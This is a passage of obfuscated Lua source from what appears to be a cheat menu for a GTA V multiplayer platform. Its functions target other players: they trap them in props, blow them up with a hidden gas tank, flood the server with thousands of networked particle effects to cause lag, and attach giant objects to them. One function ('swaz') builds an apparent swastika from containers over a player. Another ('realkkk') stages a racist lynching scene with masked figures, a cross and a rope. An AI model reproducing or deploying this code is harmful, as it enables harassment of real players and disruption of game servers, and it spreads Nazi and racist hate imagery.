                            nlFXKkFxuKQAk.natives.SetCamCoord(cam, nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(pped, 3.0 - (offset - 7.5), (-4.5 + customforward) + offset, height))
                        else
                            nlFXKkFxuKQAk.natives.SetCamCoord(cam, nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(pped, 3.0, (-4.5 + customforward) + offset, height))
                        end
                    else
                        if offset < -3.0 then
                            if offset < -7.5 then
                                nlFXKkFxuKQAk.natives.SetCamCoord(cam, nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(pped, -3.0 - (offset + 7.5), (-4.5 + customforward) - offset, height))
                            else
                                nlFXKkFxuKQAk.natives.SetCamCoord(cam, nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(pped, -3.0, (-4.5 + customforward) - offset, height))
                            end
                        else
                            if offset > 0.0 then
                                nlFXKkFxuKQAk.natives.SetCamCoord(cam, nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(pped, offset, (-4.5 + customforward) + offset, height))
                            else
                                nlFXKkFxuKQAk.natives.SetCamCoord(cam, nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(pped, offset, (-4.5 + customforward) - offset, height))
                            end
                        end
                    end
                end
                nlFXKkFxuKQAk.natives.ClearFocus()
            end)
        end,
        TeleportToPlayer = function(target)
            local ped = nlFXKkFxuKQAk.natives.GetPlayerPed(target)
            local pos = nlFXKkFxuKQAk.natives.GetEntityCoords(ped)
            if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(ped, false) then
                local vehicle = nlFXKkFxuKQAk.natives.GetVehiclePedIsUsing(ped)
	            local seats = nlFXKkFxuKQAk.natives.GetVehicleMaxNumberOfPassengers(vehicle)
                for i = 0, seats do
		            if nlFXKkFxuKQAk.natives.IsVehicleSeatFree(vehicle, i) then
			            nlFXKkFxuKQAk.natives.SetPedIntoVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), vehicle, i)
			            break
		            end
	            end
            else
                nlFXKkFxuKQAk.natives.SetEntityCoordsNoOffset(nlFXKkFxuKQAk.natives.PlayerPedId(), pos.x, pos.y, pos.z, false, false, false, true)
            end
        end,
        cagerino = function(player)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)
            local pedloc = nlFXKkFxuKQAk.natives.GetEntityCoords(stupidped, false)
            local obj = 'prop_doghouse_01'
            local objh = RfPsUKHSFWJuBEJuz.rE.LumHash(obj)
            local bobject = nlFXKkFxuKQAk.natives.CreateObject(objh, pedloc.x, pedloc.y, pedloc.z, true, false, true)
            nlFXKkFxuKQAk.natives.SetEntityInvincible(bobject, true)
        end,
        goboom = function(player)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)
            local pedloc = nlFXKkFxuKQAk.natives.GetEntityCoords(stupidped, false)
            local obj = 'prop_gas_tank_01a'
            local objh = RfPsUKHSFWJuBEJuz.rE.LumHash(obj)
            if not nlFXKkFxuKQAk.natives.HasModelLoaded(objh) then
                RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                nlFXKkFxuKQAk.natives.RequestModel(objh)
            else
                local obhc = nlFXKkFxuKQAk.natives.CreateObject(objh, pedloc.x, pedloc.y, pedloc.z, true, false, true)
                local rot = nlFXKkFxuKQAk.natives.GetEntityRotation(obhc)
                local direct = jrnyLearIyzKiSIen.func.RotationToDirection(rot)
                local obloc = nlFXKkFxuKQAk.natives.GetEntityCoords(obhc, false)
                nlFXKkFxuKQAk.natives.SetEntityVisible(obhc, false)
                if nlFXKkFxuKQAk.natives.DoesEntityExist(obhc) then           
                    for i = 1, 10 do
                        nlFXKkFxuKQAk.natives.ShootSingleBulletBetweenCoords((obloc.x + direct.x), (obloc.y + direct.y), (obloc.z + obloc.z), obloc.x, obloc.y, obloc.z, 100.0, false, `WEAPON_PISTOL`, nlFXKkFxuKQAk.natives.PlayerPedId(), true, false, 1000.0)
                    end
                end
            end
        end,
        lagmen = function(player)
            local gox_dict = "core"					
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)
            local pedloc = nlFXKkFxuKQAk.natives.GetEntityCoords(stupidped, false)
        
            nlFXKkFxuKQAk.natives.RequestNamedPtfxAsset(gox_dict)					
            while not nlFXKkFxuKQAk.natives.HasNamedPtfxAssetLoaded(gox_dict) do						
                RfPsUKHSFWJuBEJuz.rE.LumWait(10)				
            end
            
            for i = 1, 1000 do
                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)
                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("veh_light_amber",pedloc.x,pedloc.y,pedloc.z,0,0,0,100.0,0,0,0)							
                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)							
                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("veh_backfire",pedloc.x,pedloc.y,pedloc.z,0,0,0,100.0,0,0,0)							
                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)							
                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("td_blood_shotgun",pedloc.x,pedloc.y,pedloc.z,0,0,0,100.0,0,0,0)							
                nlFXKkFxuKQAk.natives.UseParticleFxAsset(gox_dict)							
                nlFXKkFxuKQAk.natives.StartNetworkedParticleFxNonLoopedAtCoord("veh_respray_smoke",pedloc.x,pedloc.y,pedloc.z,0,0,0,100.0,0,0,0)							
            end
        end,
        ball = function(player)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)						
            local IONOBJ = "stt_prop_stunt_soccer_ball"						
            local IONOBJH = RfPsUKHSFWJuBEJuz.rE.LumHash(IONOBJ)						
            local IONCOBJ = nlFXKkFxuKQAk.natives.CreateObject(IONOBJH, 0, 0, 0, true, true, true)						
            if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(stupidped, false) then
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, 0, -1.0, 0.0, 0.0, 0, false, false, false, false, 1, true)
            else
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            end
        end,
        ctreemen = function(player)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)						
            local IONOBJ = "prop_xmas_tree_int"						
            local IONOBJH = RfPsUKHSFWJuBEJuz.rE.LumHash(IONOBJ)						
            local IONCOBJ = nlFXKkFxuKQAk.natives.CreateObject(IONOBJH, 0, 0, 0, true, true, true)						
            nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
        end,
        ferris = function(player)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)
            local IONOBJ = "prop_Ld_ferris_wheel"						
            local IONOBJH = RfPsUKHSFWJuBEJuz.rE.LumHash(IONOBJ)						
            local IONCOBJ = nlFXKkFxuKQAk.natives.CreateObject(IONOBJH, 0, 0, 0, true, true, true)
            if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(stupidped, false) then						
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            else
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            end
        end,
        barge = function(player)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)
            local IONOBJ = "prop_lev_des_barge_02"						
            local IONOBJH = RfPsUKHSFWJuBEJuz.rE.LumHash(IONOBJ)						
            local IONCOBJ = nlFXKkFxuKQAk.natives.CreateObject(IONOBJH, 0, 0, 0, true, true, true)						
            if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(stupidped, false) then
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            else    
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
            end
        end,
        swaz = function(player)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)
            local object = RfPsUKHSFWJuBEJuz.rE.LumHash('prop_container_03a')							
            local x, y, z = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(nlFXKkFxuKQAk.natives.GetEntityCoords(stupidped, true))							
            local IONCOBJ = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ1 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ2 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ3 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ4 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ5 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ6 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ7 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ8 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ9 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ10 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ11 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ12 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ13 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ14 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)
            local IONCOBJ15 = nlFXKkFxuKQAk.natives.CreateObject(object, x, y, z, true, true, true)							
            if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(stupidped, false) then
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ,  nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, 0.0, 10.0, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ1, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, 5.0, 10.0, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ2, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, -0.5, 15.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ3, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, -0.5, 20.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ4, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, -4.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ5, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, -9.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ6, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, -9.5, 19.5, 90.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ7, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, -9.5, 13.5, 90.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ8, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, -0.5, 27.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ9, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, -0.5, 32.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ10, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, -5.0, 32.6, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ11, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, -10.0, 32.6, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ12, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, 0.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ13, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0.0, 5.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ14, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, 8.5, 27.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
				RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
				nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ15, nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(stupidped, false), 0, 0, 8.5, 32.0, 90.0, 0.0, 0, true, true, false, true, 1, true)
            else
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, 0.0, 10.0, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ1, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, 5.0, 10.0, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ2, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, -0.5, 15.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ3, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, -0.5, 20.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ4, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, -4.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ5, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, -9.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ6, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, -9.5, 19.5, 90.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ7, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, -9.5, 13.5, 90.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ8, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, -0.5, 27.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ9, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, -0.5, 32.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ10, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, -5.0, 32.6, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ11, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, -10.0, 32.6, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ12, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, 0.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ13, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0.0, 5.0, 21.7, 0.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ14, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, 8.5, 27.0, 90.0, 0.0, 0, true, true, false, true, 1, true)							
                RfPsUKHSFWJuBEJuz.rE.LumWait(100)							
                nlFXKkFxuKQAk.natives.AttachEntityToEntity(IONCOBJ15, stupidped, nlFXKkFxuKQAk.natives.GetPedBoneIndex(stupidped, 0), 0, 8.5, 32.0, 90.0, 0.0, 0, true, true, false, true, 1, true)
            end
        end,
        spawnvehicle = function(ModelName)
            if ModelName and nlFXKkFxuKQAk.natives.IsModelValid(ModelName) and nlFXKkFxuKQAk.natives.IsModelAVehicle(ModelName) then
              nlFXKkFxuKQAk.natives.RequestModel(ModelName)
              while not nlFXKkFxuKQAk.natives.HasModelLoaded(ModelName) do
                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
              end
              local veh = nlFXKkFxuKQAk.natives.CreateVehicle(RfPsUKHSFWJuBEJuz.rE.LumHash(ModelName), nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId()), nlFXKkFxuKQAk.natives.GetEntityHeading(nlFXKkFxuKQAk.natives.PlayerPedId()), true, true)
              nlFXKkFxuKQAk.natives.SetPedIntoVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), veh, -1)
            else
              RfPsUKHSFWJuBEJuz.rE.pront("Invalid")
            end
        end,
        realkkk = function()
            local objh = RfPsUKHSFWJuBEJuz.rE.LumHash('prop_tree_olive_cr2')
            local tree = nlFXKkFxuKQAk.natives.CreateObject(objh, 105.519, -1940.525, 18.503, true, false, true)
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')
            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)		
            end
            local pedc = nlFXKkFxuKQAk.natives.CreatePed('PED_TYPE_NETWORK_PLAYER', characterModel, 99.874, -1939.423, 19.803, 270.0, true, false)
            local pedc1 = nlFXKkFxuKQAk.natives.CreatePed('PED_TYPE_NETWORK_PLAYER', characterModel, 100.417, -1938.018, 19.803, 236.226, true, false)
            local pedc2 = nlFXKkFxuKQAk.natives.CreatePed('PED_TYPE_NETWORK_PLAYER', characterModel, 101.363, -1936.819, 19.803, 223.971, true, false)
            local pedc3 = nlFXKkFxuKQAk.natives.CreatePed('PED_TYPE_NETWORK_PLAYER', characterModel, 102.748, -1936.815, 19.803, 179.659, true, false)
            local pedc4 = nlFXKkFxuKQAk.natives.CreatePed('PED_TYPE_NETWORK_PLAYER', characterModel, 100.337, -1940.852, 19.803, 297.803, true, false)
            local hped = nlFXKkFxuKQAk.natives.CreatePed('PED_TYPE_NETWORK_PLAYER', characterModel, 103.160, -1939.648, 21.803, 45.745, true, false)
        
            local CrossModel = RfPsUKHSFWJuBEJuz.rE.LumHash('prop_fncwood_14a')
            local createC = nlFXKkFxuKQAk.natives.CreateObject(CrossModel, 104.690, -1938.063, 20.003, true, false, true)
            local createC1 = nlFXKkFxuKQAk.natives.CreateObject(CrossModel, 104.690, -1938.063, 19.603, true, false, true)
            local createC2 = nlFXKkFxuKQAk.natives.CreateObject(CrossModel, 104.690, -1938.063, 20.503, true, false, true)
            local createC3 = nlFXKkFxuKQAk.natives.CreateObject(CrossModel, 104.690, -1938.063, 20.503, true, false, true)
            nlFXKkFxuKQAk.natives.AttachEntityToEntity(createC, createC3, 0.0, 0.0, 0.4, 0.5, 90.0, 0.0, false, false, false, 0.0, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(createC, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(createC1, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(createC2, true)
        
            nlFXKkFxuKQAk.natives.AddRope(103.160, -1939.648, 26.803, 0.0, 0.0, 0.0, 2.0, 4, 2.0, 1.0, 0.0, false, false, false, 5.0, false)
        
            -- Outfit
        
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')	
            local face = 0	
            local skin = 10	
            local beard_1 = 10	
            local beard_2 = 10	
            local beard_3 = 1	
            local beard_4 = 1	
            local eyebrows_1 = 1	
            local eyebrows_2 = 10	
            local eyebrows_3 = 1	
            local eyebrows_4 = 1	
            local hair_1 = 1	
            local hair_2 = 0	
            local hair_color_1 = 1	
            local hair_color_2 = 1	
            local tshirt_1 = 15	
            local tshirt_2 = 0	
            local torso_1 = 107	
            local torso_2 = 0	
            local decals_1 = 0	
            local decals_2 = 0	
            local arms = 75
            local pants_1 = 23	
            local pants_2 = 4	
            local shoes_1 = 1	
            local shoes_2 = 1	
            local mask_1 = 52	
            local mask_2 = 2	
            local bproof_1 = 0	
            local bproof_2 = 0	
            local chain_1 = 0	
            local chain_2 = 0	
            local helmet_1 = 1	
            local helmet_2 = 0	
            local glasses_1 = 24	
            local glasses_2 = 5	
            local watches_1 = 3	
            local watches_2 = 0	
            local ears_1 = 19	
            local ears_2 = 0
        
            local face1 = 0	
            local skin1 = 15	
            local beard_11 = 10	
            local beard_21 = 10	
            local beard_31 = 1	
            local beard_41 = 1	
            local eyebrows_11 = 1	
            local eyebrows_21 = 10	
            local eyebrows_31 = 1	
            local eyebrows_41 = 1	
            local hair_11 = 1	
            local hair_21 = 0	
            local hair_color_11 = 1	
            local hair_color_21 = 1	
            local tshirt_11 = 15	
            local tshirt_21 = 0	
            local torso_11 = 15	
            local torso_21 = 0	
            local decals_11 = 0	
            local decals_21 = 0	
            local arms1 = 15
            local pants_11 = 21
            local pants_21 = 0	
            local shoes_11 = 34	
            local shoes_21 = 0	
            local mask_11 = 0	
            local mask_21 = 0	
            local bproof_11 = 0	
            local bproof_21 = 0	
            local chain_11 = 0	
            local chain_21 = 0	
            local helmet_11 = -1	
            local helmet_21 = 0	
            local glasses_11 = 0	
            local glasses_21 = 0	
            local watches_11 = 0	
            local watches_21 = 0	
            local ears_11 = 19	
            local ears_21 = 0
                
            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		
                    
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(500)		
            end
                
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc,face, face, face, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc, 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc, 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc, 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc, 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(pedc,hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc, 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8,tshirt_1,tshirt_2, 2)
            
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc1,face, face, face, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc1, 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc1, 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc1, 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc1, 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(pedc1,hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc1, 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc1, 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc1, 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc1, 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 1,mask_1,mask_2, 2)		
